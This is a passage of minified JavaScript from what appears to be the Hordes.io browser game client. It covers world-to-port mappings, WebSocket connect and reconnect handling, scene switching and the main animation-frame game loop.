        setPlayer(t) {
            this.player = t,
                we.set(!0),
                EI()
        }
        removePlayer(t) {
            this.player == t && (this.player = void 0,
                we.set(!1))
        }
        setSmoothTime(t) {
            this.smoothtime += t,
                Math.abs(this.smoothtime - this.time) > .1 && (this.smoothtime = this.time)
        }
    }
    const _I = {
        guardstone: {
            port: 5002
        },
        headless: {
            port: 5003
        },
        faivel: {
            port: 5004
        },
        arena3v3: {
            port: 5006
        },
        arena5v5: {
            port: 5007
        },
        dev: {
            port: 5008
        }
    }
        , CI = () => {
            Am(ro.serverOnClientConnect.header, t => {
                const e = ro.serverOnClientConnect.decode(t);
                Ua.load(e.world, e.file, e.playerId),
                    document.cookie = "party=",
                    HS("log", "Entering " + (e.world.charAt(0).toUpperCase() + e.world.slice(1)))
            }
            ),
                Am("close", t => {
                    switch (Ua.destroy(),
                    t.code) {
                        default:
                        case 1006:
                        case 4002:
                            ee.set("autoReconnect");
                            break;
                        case 4003:
                            ee.set("askReconnect");
                            break;
                        case 4004:
                            window.location.href = "/"
                    }
                }
                )
        }
        , TI = t => {
            Ua.deserialized || ee.set(!0),
                zm(),
                Rm(t.target)
        }
        ;
    let PI = 0;
    const II = t => {
        if (Ua && Ua.deserialized && Ua.player) {
            Tl(),
                YT(t),
                Ua.tick(t),
                VT(t),
                nm(t, Ua),
                im(),
                GT(t);
            const e = Th();
            vm(e - PI),
                PI = e
        } else
            Ua && Ua.tick(t)
    }
        ;
    var DI = Object.freeze({
        __proto__: null,
        init: CI,
        enter: TI,
        tick: II
    });
    const AI = {};
    let BI;
    const RI = (t, e) => {
        AI[t] = e,
            e.init && e.init()
    }
        , zI = (t, e) => {
            AI[BI] && AI[BI].exit && AI[BI].exit(),
                BI = t,
                se.set(t),
                AI[BI].enter && AI[BI].enter(e)
        }
        , FI = t => {
            BI && AI[BI].tick && AI[BI].tick(t)
        }
        ;
    let ZI;
    window.onload = () => {
        er(),
            Cl(),
            em(),
            WT(),
            Qa(new MI({})),
            console.log("Hordes 0.30.4002 Live"),
            RI("play", DI),
            Le.subscribe(t => {
                t && void 0 !== _I[t] ? zI("play", {
                    target: "hordes.io:" + _I[t].port
                }) : ee.set("autoReconnect")
            }
            ),
            OI()
    }
        ;
    let UI = 0
        , LI = !1;
    const NI = new fh(0, 2e4)
        , OI = () => {
            const t = Th()
                , e = (t - (ZI || 1e3 / 60)) / 1e3;
            ZI = t,
                FI(e),
                requestAnimationFrame(OI),
                NI.done(t) && (t > 1e5 && !LI && t - UI > 18e4 ? (LI = !0,
                    UI = t,
                    Ce.set(!0)) : LI && (LI = !1,
                        Ce.set(!1)),
                    Bp("session", "minutetick", "sec", Math.round(t / 1e3)),
                    NI.reset(t))
        }
}();
